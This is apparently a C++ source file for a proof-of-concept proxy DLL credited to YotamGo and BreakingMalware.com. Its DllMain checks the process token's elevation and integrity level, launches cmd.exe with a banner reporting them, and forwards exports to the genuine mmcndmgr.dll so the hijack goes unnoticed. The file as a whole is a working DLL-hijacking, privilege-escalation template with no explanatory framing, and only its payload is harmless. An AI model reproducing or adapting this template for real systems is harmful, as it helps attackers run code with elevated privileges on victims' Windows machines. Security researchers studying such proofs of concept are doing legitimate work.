#include <windows.h>
#include <stdio.h>
HINSTANCE mHinst = 0, mHinstDLL = 0;
extern "C" UINT_PTR mProcs[5] = {0};

LPCSTR mImportNames[] = {"CreateExecutivePlatform", "DllCanUnloadNow", "DllGetClassObject", "DllRegisterServer", "DllUnregisterServer"};

char *GetStartupString(DWORD isElevated, DWORD integrityLevel)
{
	const char format[] = "/k @echo Eleven PoC by YotamGo * BreakingMalware.com Sponsored by enSilo * Elevation: %d, Integrity: %s \0";
	char levelString[8];
	char *result = (char*)malloc(115);
	if (integrityLevel == SECURITY_MANDATORY_SYSTEM_RID)
	{
		sprintf(levelString, "%s", "System");
	}
	else if (integrityLevel == SECURITY_MANDATORY_HIGH_RID)
	{
		sprintf(levelString, "%s", "High");
	}
	else if (integrityLevel == SECURITY_MANDATORY_MEDIUM_RID)
	{
		sprintf(levelString, "%s", "Medium");
	}
	else if (integrityLevel == SECURITY_MANDATORY_LOW_RID)
	{
		sprintf(levelString, "%s", "Low");
	}
	else
	{
		sprintf(levelString, "%s", "Unknown");
	}
	sprintf(result, format, isElevated, levelString);
	return result;
}

VOID GetIntegrityInfo(PDWORD isElevated, PDWORD integrityLevel)
{
	HANDLE hProcess = 0;
	DWORD sizeNeeded = 0;
	HANDLE hToken;
	TOKEN_ELEVATION_TYPE elevationType;
	PTOKEN_MANDATORY_LABEL pLabel = 0;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());

	if (hProcess)
	{
		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
		{
			GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(elevationType), &sizeNeeded);
			*isElevated = (elevationType == TokenElevationTypeFull);
			GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &sizeNeeded);
			pLabel = (PTOKEN_MANDATORY_LABEL)(malloc(sizeNeeded));
			if (pLabel)
			{
				if (GetTokenInformation(hToken, TokenIntegrityLevel, pLabel, sizeNeeded, &sizeNeeded))
				{
					if (GetSidSubAuthorityCount(pLabel->Label.Sid))
					{
						*integrityLevel = *GetSidSubAuthority(pLabel->Label.Sid, 0);
						free(pLabel);
					}
				}
			}
		}
	}
}
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved ) {
	mHinst = hinstDLL;

	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInfo;
	DWORD integrityLevel = 0;
	DWORD isElevated = 0;
	char *param = 0;
	memset(&startupInfo, 0, sizeof(startupInfo));
	GetIntegrityInfo(&isElevated, &integrityLevel);
	param = GetStartupString(isElevated, integrityLevel);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", param, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
	free(param);

	if ( fdwReason == DLL_PROCESS_ATTACH ) {
		mHinstDLL = LoadLibrary( "C:\\Windows\\System32\\mmcndmgr.dll" );
		if ( !mHinstDLL )
			return ( FALSE );
		for ( int i = 0; i < 5; i++ )
			mProcs[ i ] = (UINT_PTR)GetProcAddress( mHinstDLL, mImportNames[ i ] );
	} else if ( fdwReason == DLL_PROCESS_DETACH ) {
		FreeLibrary( mHinstDLL );
	}
	return ( TRUE );
}

extern "C" void CreateExecutivePlatform_wrapper();
extern "C" void DllCanUnloadNow_wrapper();
extern "C" void DllGetClassObject_wrapper();
extern "C" void DllRegisterServer_wrapper();
extern "C" void DllUnregisterServer_wrapper();
